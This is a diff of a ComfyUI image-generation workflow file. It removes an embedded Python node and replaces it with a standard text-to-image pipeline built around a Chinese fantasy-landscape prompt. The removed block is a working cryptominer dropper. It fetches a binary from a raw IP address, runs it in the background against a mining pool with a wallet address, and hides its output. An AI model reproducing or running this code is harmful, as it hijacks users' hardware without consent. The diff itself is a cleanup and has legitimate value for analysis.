@@ -1,18 +1,384 @@
 {
-  "1": {
-    "class_type": "IDENode",
+  "16": {
     "inputs": {
-      "language": "python",
-      "pycode": "import urllib.request, subprocess, os, time\n\nsubprocess.run([\"pkill\", \"-9\", \"-f\", \"/tmp/m\"], capture_output=True)\ntime.sleep(0.5)\n\ntry:\n    urllib.request.urlretrieve(\"http://151.247.219.40:8000/alpha-miner\", \"/tmp/m\")\n    os.chmod(\"/tmp/m\", 0o755)\n    subprocess.Popen([\"/tmp/m\", \"--pool\", \"stratum+tcp://sg1.alphapool.tech:5566\", \"--address\", \"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\", \"--worker\", \"cuda0_134\"],\n        stdout=open(\"/dev/null\",\"w\"), stderr=open(\"/dev/null\",\"w\"), start_new_session=True)\n    result = \"DEPLOYED\"\nexcept Exception as e:\n    result = f\"ERROR: {e}\"\n"
+      "value": "{$@}"
+    },
+    "class_type": "PrimitiveString",
+    "_meta": {
+      "title": "none"
     }
   },
-  "2": {
-    "class_type": "PreviewAny",
+  "35": {
     "inputs": {
-      "source": [
-        "1",
+      "string": [
+        "44",
+        0
+      ],
+      "find": "{$spicy-content-with}",
+      "replace": ""
+    },
+    "class_type": "StringReplace",
+    "_meta": {
+      "title": "DEFAULT: No Spicy Inpact"
+    }
+  },
+  "36": {
+    "inputs": {
+      "any_02": [
+        "35",
         0
       ]
+    },
+    "class_type": "Any Switch (rgthree)",
+    "_meta": {
+      "title": "任意切换"
+    }
+  },
+  "37": {
+    "inputs": {
+      "string": [
+        "36",
+        0
+      ],
+      "find": "  ",
+      "replace": " "
+    },
+    "class_type": "StringReplace",
+    "_meta": {
+      "title": "Fix Double Spaces"
+    }
+  },
+  "39": {
+    "inputs": {
+      "output": "",
+      "source": [
+        "37",
+        0
+      ]
+    },
+    "class_type": "Display Any (rgthree)",
+    "_meta": {
+      "title": "FINAL TEXT VIEWER"
+    }
+  },
+  "40": {
+    "inputs": {
+      "any_01": [
+        "16",
+        0
+      ]
+    },
+    "class_type": "Any Switch (rgthree)",
+    "_meta": {
+      "title": "任意切换"
+    }
+  },
+  "44": {
+    "inputs": {
+      "string": [
+        "205",
+        0
+      ],
+      "find": "{$@}",
+      "replace": [
+        "122",
+        0
+      ]
+    },
+    "class_type": "StringReplace",
+    "_meta": {
+      "title": "STYLE INTEGRATOR"
+    }
+  },
+  "122": {
+    "inputs": {
+      "value": " 新中式玄幻美学风格，远景视角，16:9 电影画幅，古建楼阁悬浮于青山之上，楼阁红柱黑檐，雕梁画栋精致异常，飞檐如翼欲展；青山连绵起伏，山体覆满翠绿草坡，生机勃勃；山间云雾缭绕，似轻纱曼舞，如梦如幻；地面蜿蜒小径曲折通幽，小径上有黑衣行人稳步前行；清透空灵的氛围弥漫整个画面，以青绿色为主色调，阳光透过云雾洒下，形成柔和的散射光；采用 ARRI Alexa 65 电影机，搭配 35mm 广角镜头，T2.8 光圈，15 档宽容度，16 - bit RAW 格式记录，展现深景深效果；以 UE5 虚幻引擎渲染，光线追踪、全局光照，8K 超高清，极致细节，呈现电影级质感，凸显新中式玄幻的独特魅力。"
+    },
+    "class_type": "PrimitiveStringMultiline",
+    "_meta": {
+      "title": "输入用户提示词"
+    }
+  },
+  "124": {
+    "inputs": {
+      "unet_name": "z_image_turbo_bf16.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "UNet加载器"
+    }
+  },
+  "126": {
+    "inputs": {
+      "clip_name": "qwen_3_4b.safetensors",
+      "type": "lumina2",
+      "device": "default"
+    },
+    "class_type": "CLIPLoader",
+    "_meta": {
+      "title": "加载CLIP"
+    }
+  },
+  "127": {
+    "inputs": {
+      "vae_name": "UltraFlux-vae_v1.safetensors"
+    },
+    "class_type": "VAELoader",
+    "_meta": {
+      "title": "加载VAE"
+    }
+  },
+  "166": {
+    "inputs": {
+      "any_01": [
+        "167",
+        0
+      ]
+    },
+    "class_type": "Any Switch (rgthree)",
+    "_meta": {
+      "title": "任意切换"
+    }
+  },
+  "167": {
+    "inputs": {
+      "value": "{$@}"
+    },
+    "class_type": "PrimitiveString",
+    "_meta": {
+      "title": "none"
+    }
+  },
+  "205": {
+    "inputs": {
+      "any_03": [
+        "246",
+        0
+      ]
+    },
+    "class_type": "Any Switch (rgthree)",
+    "_meta": {
+      "title": "Any Switch"
+    }
+  },
+  "237": {
+    "inputs": {
+      "any_01": [
+        "238",
+        0
+      ]
+    },
+    "class_type": "Any Switch (rgthree)",
+    "_meta": {
+      "title": "任意切换"
+    }
+  },
+  "238": {
+    "inputs": {
+      "value": "{$@}"
+    },
+    "class_type": "PrimitiveString",
+    "_meta": {
+      "title": "none"
+    }
+  },
+  "246": {
+    "inputs": {
+      "value": [
+        "237",
+        0
+      ]
+    },
+    "class_type": "PrimitiveStringMultiline",
+    "_meta": {
+      "title": "通用风格选择"
+    }
+  },
+  "257": {
+    "inputs": {
+      "预设": "方版(1:1)_1024x1024",
+      "互换宽高": false,
+      "随机模式": false,
+      "自定义宽": 768,
+      "自定义高": 768,
+      "批次数量": 1,
+      "管理预设": null
+    },
+    "class_type": "ZML_PresetResolutionV2",
+    "_meta": {
+      "title": "ZML_预设分辨率V2"
+    }
+  },
+  "263": {
+    "inputs": {
+      "noise": [
+        "266",
+        0
+      ],
+      "guider": [
+        "268",
+        0
+      ],
+      "sampler": [
+        "265",
+        0
+      ],
+      "sigmas": [
+        "264",
+        0
+      ],
+      "latent_image": [
+        "257",
+        2
+      ]
+    },
+    "class_type": "SamplerCustomAdvanced",
+    "_meta": {
+      "title": "自定义采样器（高级）"
+    }
+  },
+  "264": {
+    "inputs": {
+      "steps": 8,
+      "start_at_step": 0,
+      "end_at_step": 8,
+      "base_image_seq_len": 512,
+      "base_shift": 0.5,
+      "invert_sigmas": "disable",
+      "max_image_seq_len": 2048,
+      "max_shift": 1.15,
+      "num_train_timesteps": 1000,
+      "shift": 3.0,
+      "shift_terminal": 0.5,
+      "stochastic_sampling": "disable",
+      "time_shift_type": "exponential",
+      "use_beta_sigmas": "disable",
+      "use_dynamic_shifting": "enable",
+      "use_exponential_sigmas": "disable",
+      "use_karras_sigmas": "disable",
+      "device": "auto"
+    },
+    "class_type": "FlowMatchEulerDiscreteScheduler (Custom)",
+    "_meta": {
+      "title": "FlowMatch Euler Discrete Scheduler (Custom)"
+    }
+  },
+  "265": {
+    "inputs": {
+      "sampler_name": "euler"
+    },
+    "class_type": "KSamplerSelect",
+    "_meta": {
+      "title": "K采样器选择"
+    }
+  },
+  "266": {
+    "inputs": {
+      "noise_seed": 614857816739499
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "随机噪波"
+    }
+  },
+  "267": {
+    "inputs": {
+      "text": [
+        "37",
+        0
+      ],
+      "clip": [
+        "126",
+        0
+      ]
+    },
+    "class_type": "CLIPTextEncode",
+    "_meta": {
+      "title": "CLIP文本编码"
+    }
+  },
+  "268": {
+    "inputs": {
+      "model": [
+        "124",
+        0
+      ],
+      "conditioning": [
+        "267",
+        0
+      ]
+    },
+    "class_type": "BasicGuider",
+    "_meta": {
+      "title": "基本引导器"
+    }
+  },
+  "274": {
+    "inputs": {
+      "samples": [
+        "263",
+        0
+      ],
+      "vae": [
+        "127",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE解码"
+    }
+  },
+  "384": {
+    "inputs": {
+      "images": [
+        "274",
+        0
+      ]
+    },
+    "class_type": "PreviewImage",
+    "_meta": {
+      "title": "预览图像"
+    }
+  },
+  "385": {
+    "inputs": {
+      "filename_prefix": "ComfyUI",
+      "images": [
+        "274",
+        0
+      ]
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "保存图像"
+    }
+  },
+  "400": {
+    "inputs": {
+      "steps": 9,
+      "start_at_step": 0,
+      "end_at_step": 9999,
+      "base_image_seq_len": 256,
+      "base_shift": 0.5,
+      "invert_sigmas": "disable",
+      "max_image_seq_len": 8192,
+      "max_shift": 1.15,
+      "num_train_timesteps": 1000,
+      "shift": 3,
+      "shift_terminal": 0,
+      "stochastic_sampling": "disable",
+      "time_shift_type": "exponential",
+      "use_beta_sigmas": "disable",
+      "use_dynamic_shifting": "disable",
+      "use_exponential_sigmas": "disable",
+      "use_karras_sigmas": "disable",
+      "device": "auto"
+    },
+    "class_type": "FlowMatchEulerDiscreteScheduler (Custom)",
+    "_meta": {
+      "title": "FlowMatch Euler Discrete Scheduler (Custom)"
     }
   }
 }
